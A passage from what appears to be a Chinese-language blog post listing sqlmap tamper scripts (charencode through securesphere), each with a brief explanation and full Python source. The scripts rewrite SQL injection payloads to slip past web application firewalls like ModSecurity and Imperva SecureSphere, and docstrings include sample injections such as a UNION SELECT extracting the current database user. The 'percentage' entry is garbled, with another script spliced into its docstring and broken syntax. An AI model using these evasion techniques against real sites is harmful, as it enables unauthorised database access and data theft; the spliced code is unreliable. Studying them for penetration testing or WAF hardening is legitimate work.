string.hexdigits:</span><br><span class="line">                retVal += &#x27;%%25%s&#x27; % payload[i + 1:i + 3]</span><br><span class="line">                i += 3</span><br><span class="line">            else:</span><br><span class="line">                retVal += &#x27;%%25%.2X&#x27; % ord(payload[i])</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>8.charencode  对整个进行一次URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Url-encodes all characters in a given payload (not processing already</span><br><span class="line">    encoded)</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak web application firewalls that do not</span><br><span class="line">          url-decode the request before processing it through their ruleset</span><br><span class="line">        * The web server will anyway pass the url-decoded version behind,</span><br><span class="line">          hence it should work against any DBMS</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT FIELD FROM%20TABLE&#x27;)</span><br><span class="line">    &#x27;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        while i &lt; len(payload):</span><br><span class="line">            if payload[i] == &#x27;%&#x27; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:</span><br><span class="line">                retVal += payload[i:i + 3]</span><br><span class="line">                i += 3</span><br><span class="line">            else:</span><br><span class="line">                retVal += &#x27;%%%.2X&#x27; % ord(payload[i])</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>9.charunicodeencode  对整个进行Unicode编码（也就是S转换为%u0053）【主要体现在asp asp.net上】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Unicode-url-encodes non-encoded characters in a given payload (not</span><br><span class="line">    processing already encoded)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * ASP</span><br><span class="line">        * ASP.NET</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2000</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 5.1.56</span><br><span class="line">        * PostgreSQL 9.0.3</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak web application firewalls that do not</span><br><span class="line">          unicode url-decode the request before processing it through their</span><br><span class="line">          ruleset</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT FIELD%20FROM TABLE&#x27;)</span><br><span class="line">    &#x27;%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        while i &lt; len(payload):</span><br><span class="line">            if payload[i] == &#x27;%&#x27; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:</span><br><span class="line">                retVal += &quot;%%u00%s&quot; % payload[i + 1:i + 3]</span><br><span class="line">                i += 3</span><br><span class="line">            else:</span><br><span class="line">                retVal += &#x27;%%u%.4X&#x27; % ord(payload[i])</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>10.concat2concatws 主要是作用于把CONCAT(A, B)替换为CONCAT_WS(MID(CHAR(0), 0, 0), A, B)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces instances like &#x27;CONCAT(A, B)&#x27; with &#x27;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&#x27;</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that filter the CONCAT() function</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;CONCAT(1,2)&#x27;)</span><br><span class="line">    &#x27;CONCAT_WS(MID(CHAR(0),0,0),1,2)&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        payload = payload.replace(&quot;CONCAT(&quot;, &quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;)</span><br><span class="line"></span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure>

<p>11.equaltolike 把等于使用like进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces all occurances of operator equal (&#x27;=&#x27;) with operator &#x27;LIKE&#x27;</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls that</span><br><span class="line">          filter the equal character (&#x27;=&#x27;)</span><br><span class="line">        * The LIKE operator is SQL standard. Hence, this tamper script</span><br><span class="line">          should work against all (?) databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT * FROM users WHERE id=1&#x27;)</span><br><span class="line">    &#x27;SELECT * FROM users WHERE id LIKE 1&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&quot;\s*=\s*&quot;, &quot; LIKE &quot;, retVal)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>12.greatest  主要的作用是把A&gt;B使用GREATEST(A,B+1)&#x3D;A进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces greater than operator (&#x27;&gt;&#x27;) with &#x27;GREATEST&#x27; counterpart</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls that</span><br><span class="line">          filter the greater than character</span><br><span class="line">        * The GREATEST clause is a widespread SQL command. Hence, this</span><br><span class="line">          tamper script should work against majority of databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND A &gt; B&#x27;)</span><br><span class="line">    &#x27;1 AND GREATEST(A,B+1)=A&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        match = re.search(r&quot;(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^&gt;]+?)\s*&gt;\s*([^&gt;#-]+)&quot;, payload)</span><br><span class="line"></span><br><span class="line">        if match:</span><br><span class="line">            _ = &quot;%sGREATEST(%s,%s+1)=%s&quot; % (match.group(1), match.group(4), match.group(5), match.group(4))</span><br><span class="line">            retVal = retVal.replace(match.group(0), _)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>13.halfversionedmorekeywords 使用&#x2F;*!0替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Adds versioned MySQL comment before each keyword</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL &lt; 5.1</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 4.0.18, 5.0.22</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls when the</span><br><span class="line">          back-end database management system is MySQL</span><br><span class="line">        * Used during the ModSecurity SQL injection challenge,</span><br><span class="line">          http://modsecurity.org/demo/challenge.html</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;value&#x27; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#x27;QDWa&#x27;=&#x27;QDWa&quot;)</span><br><span class="line">    &quot;value&#x27;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#x27;QDWa&#x27;=&#x27;QDWa&quot;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def process(match):</span><br><span class="line">        word = match.group(&#x27;word&#x27;)</span><br><span class="line">        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:</span><br><span class="line">            return match.group().replace(word, &quot;/*!0%s&quot; % word)</span><br><span class="line">        else:</span><br><span class="line">            return match.group()</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;, lambda match: process(match), retVal)</span><br><span class="line">        retVal = retVal.replace(&quot; /*!0&quot;, &quot;/*!0&quot;)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p><strong>14.lowercase  主要是把大写转换为小写</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces each keyword character with lower case value</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that has poorly written permissive regular expressions</span><br><span class="line">        * This tamper script should work against all (?) databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span><br><span class="line">    &#x27;insert&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for match in re.finditer(r&quot;[A-Za-z_]+&quot;, retVal):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">                retVal = retVal.replace(word, word.lower())</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>15.modsecurityversioned 在两个变量之间加上 &#x2F;<em>!30%</em>&#x2F;“ 类似于1 AND 2&gt;1– 转为 1 &#x2F;<em>!30874AND 2&gt;1</em>&#x2F;–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Embraces complete query with versioned comment</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass ModSecurity WAF/IDS</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; import random</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 2&gt;1--&#x27;)</span><br><span class="line">    &#x27;1 /*!30874AND 2&gt;1*/--&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        postfix = &#x27;&#x27;</span><br><span class="line">        for comment in (&#x27;#&#x27;, &#x27;--&#x27;, &#x27;/*&#x27;):</span><br><span class="line">            if comment in payload:</span><br><span class="line">                postfix = payload[payload.find(comment):]</span><br><span class="line">                payload = payload[:payload.find(comment)]</span><br><span class="line">                break</span><br><span class="line">        if &#x27; &#x27; in payload:</span><br><span class="line">            retVal = &quot;%s /*!30%s%s*/%s&quot; % (payload[:payload.find(&#x27; &#x27;)], randomInt(3), payload[payload.find(&#x27; &#x27;) + 1:], postfix)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>16.modsecurityzeroversioned 在两个变量之间加上 &#x2F;<em>!00000 类似于1 AND 2&gt;1– 转为 1 &#x2F;</em>!00000AND 2&gt;1*&#x2F;–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Embraces complete query with zero-versioned comment</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass ModSecurity WAF/IDS</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 2&gt;1--&#x27;)</span><br><span class="line">    &#x27;1 /*!00000AND 2&gt;1*/--&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        postfix = &#x27;&#x27;</span><br><span class="line">        for comment in (&#x27;#&#x27;, &#x27;--&#x27;, &#x27;/*&#x27;):</span><br><span class="line">            if comment in payload:</span><br><span class="line">                postfix = payload[payload.find(comment):]</span><br><span class="line">                payload = payload[:payload.find(comment)]</span><br><span class="line">                break</span><br><span class="line">        if &#x27; &#x27; in payload:</span><br><span class="line">            retVal = &quot;%s /*!00000%s*/%s&quot; % (payload[:payload.find(&#x27; &#x27;)], payload[payload.find(&#x27; &#x27;) + 1:], postfix)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>17.multiplespaces 增加空格的个数。类似把一个空格使用4个空格(或者TAB)替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Adds multiple spaces around SQL keywords</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that has poorly written permissive regular expressions</span><br><span class="line"></span><br><span class="line">    Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 UNION SELECT foobar&#x27;)</span><br><span class="line">    &#x27;1    UNION     SELECT   foobar&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        words = set()</span><br><span class="line"></span><br><span class="line">        for match in re.finditer(r&quot;[A-Za-z_]+&quot;, payload):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">                words.add(word)</span><br><span class="line"></span><br><span class="line">        for word in words:</span><br><span class="line">            retVal = re.sub(&quot;(?&lt;=\W)%s(?=[^A-Za-z_(]|\Z)&quot; % word, &quot;%s%s%s&quot; % (&#x27; &#x27; * random.randrange(1, 4), word, &#x27; &#x27; * random.randrange(1, 4)), retVal)</span><br><span class="line">            retVal = re.sub(&quot;(?&lt;=\W)%s(?=[(])&quot; % word, &quot;%s%s&quot; % (&#x27; &#x27; * random.randrange(1, 4), word), retVal)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>18.nonrecursivereplacement 主要是在(“UNION”, “SELECT”, “INSERT”, “UPDATE”, “FROM”, “WHERE”)中间继续填充一个关键词。<br> 把UNION SELECT转换为UNIOUNIONN SELESELECTCT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces predefined SQL keywords with representations</span><br><span class="line">    suitable for replacement (e.g. .replace(&quot;SELECT&quot;, &quot;&quot;)) filters</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak custom filters</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 UNION SELECT 2--&#x27;)</span><br><span class="line">    &#x27;1 UNIOUNIONN SELESELECTCT 2--&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    keywords = (&quot;UNION&quot;, &quot;SELECT&quot;, &quot;INSERT&quot;, &quot;UPDATE&quot;, &quot;FROM&quot;, &quot;WHERE&quot;)</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    warnMsg = &quot;currently only couple of keywords are being processed %s. &quot; % str(keywords)</span><br><span class="line">    warnMsg += &quot;You can set it manually according to your needs&quot;</span><br><span class="line">    singleTimeWarnMessage(warnMsg)</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for keyword in keywords:</span><br><span class="line">            _ = random.randint(1, len(keyword) - 1)</span><br><span class="line">            retVal = re.sub(r&quot;(?i)\b%s\b&quot; % keyword, &quot;%s%s%s&quot; % (keyword[:_], keyword, keyword[_:]), retVal)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>19.overlongutf8 主要为使用%C0%AA替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Converts all characters in a given payload (not processing already</span><br><span class="line">    encoded)</span><br><span class="line"></span><br><span class="line">    Reference: https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT FIELD FROM TABLE WHERE 2&gt;1&#x27;)</span><br><span class="line">    &#x27;SELECT FIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload: </span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        while i &lt; len(payload):</span><br><span class="line">            if payload[i] == &#x27;%&#x27; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:</span><br><span class="line">                retVal += payload[i:i + 3]</span><br><span class="line">                i += 3</span><br><span class="line">            else:</span><br><span class="line">                if payload[i] not in (string.ascii_letters + string.digits):</span><br><span class="line">                    retVal += &quot;%%C0%%%.2X&quot; % (0x8A | ord(payload[i]))</span><br><span class="line">                else:</span><br><span class="line">                    retVal += payload[i]</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>20.percentage  主要是使用%分割关键词类似于把SELECT 转换为%S%E%L%E%C%T</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Adds a percentage sign (&#x27;%&#x27;) infront of each character</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * ASP</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2000, 2005</span><br><span class="line">        * MySQL 5.1.56, 5.5.11</span><br><span class="line">        * PostgreSQL 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces each keyword character with random case value</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that has poorly written permissive regular expressions</span><br><span class="line">        * This tamper script should work against all (?) databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; import random</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span><br><span class="line">    &#x27;INseRt&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for match in re.finditer(r&quot;[A-Za-z_]+&quot;, retVal):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">                while True:</span><br><span class="line">                    _ = &quot;&quot;</span><br><span class="line"></span><br><span class="line">                    for i in xrange(len(word)):</span><br><span class="line">                        _ += word[i].upper() if randomRange(0, 1) else word[i].lower()</span><br><span class="line"></span><br><span class="line">                    if len(_) &gt; 1 and _ not in (_.lower(), _.upper()):</span><br><span class="line">                        break</span><br><span class="line"></span><br><span class="line">                retVal = retVal.replace(word, _)</span><br><span class="line"></span><br><span class="line">    return retVal        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT FIELD FROM TABLE&#x27;)</span><br><span class="line">    &#x27;%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        while i &lt; len(payload):</span><br><span class="line">            if payload[i] == &#x27;%&#x27; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:</span><br><span class="line">                retVal += payload[i:i + 3]</span><br><span class="line">                i += 3</span><br><span class="line">            elif </span><br><span class="line">            payload[i] != &#x27; &#x27;:</span><br><span class="line">                retVal += &#x27;%%%s&#x27; % payload[i]</span><br><span class="line">                i += 1</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>21.randomcase 随机转换大小写。类似于INSERT转换为INseRt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces each keyword character with random case value</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that has poorly written permissive regular expressions</span><br><span class="line">        * This tamper script should work against all (?) databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; import random</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span><br><span class="line">    &#x27;INseRt&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for match in re.finditer(r&quot;[A-Za-z_]+&quot;, retVal):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">                while True:</span><br><span class="line">                    _ = &quot;&quot;</span><br><span class="line"></span><br><span class="line">                    for i in xrange(len(word)):</span><br><span class="line">                        _ += word[i].upper() if randomRange(0, 1) else word[i].lower()</span><br><span class="line"></span><br><span class="line">                    if len(_) &gt; 1 and _ not in (_.lower(), _.upper()):</span><br><span class="line">                        break</span><br><span class="line"></span><br><span class="line">                retVal = retVal.replace(word, _)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>22.randomcomments 随机在关键词间插入&#x2F;<strong>&#x2F;.类似INSERT转换为I&#x2F;</strong>&#x2F;N&#x2F;**&#x2F;SERT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Add random comments to SQL keywords</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; import random</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span><br><span class="line">    &#x27;I/**/N/**/SERT&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for match in re.finditer(r&quot;\b[A-Za-z_]+\b&quot;, payload):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            if len(word) &lt; 2:</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">                _ = word[0]</span><br><span class="line"></span><br><span class="line">                for i in xrange(1, len(word) - 1):</span><br><span class="line">                    _ += &quot;%s%s&quot; % (&quot;/**/&quot; if randomRange(0, 1) else &quot;&quot;, word[i])</span><br><span class="line"></span><br><span class="line">                _ += word[-1]</span><br><span class="line"></span><br><span class="line">                if &quot;/**/&quot; not in _:</span><br><span class="line">                    index = randomRange(1, len(word) - 1)</span><br><span class="line">                    _ = word[:index] + &quot;/**/&quot; + word[index:]</span><br><span class="line"></span><br><span class="line">                retVal = retVal.replace(word, _)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>23.securesphere 再末尾增加and ‘0having’&#x3D;’0having</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Appends special crafted string</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful for bypassing Imperva SecureSphere WAF</span><br><span class="line">        * Reference: http://seclists.org/fulldisclosure/2011/May/163</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 1=1&#x27;)</span><br><span class="line">    &quot;1 AND 1=1 and &#x27;0having&#x27;=&#x27;0having&#x27;&quot;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    return payload + &quot; and &#x27;0having&#x27;=&#x27;0having&#x27;&quot; if payload else payload</span><br></pre></td></tr></table></figure>

<p>24.sp_password 针对MSSQL的一种办法。在–后面增加sp_password</p>
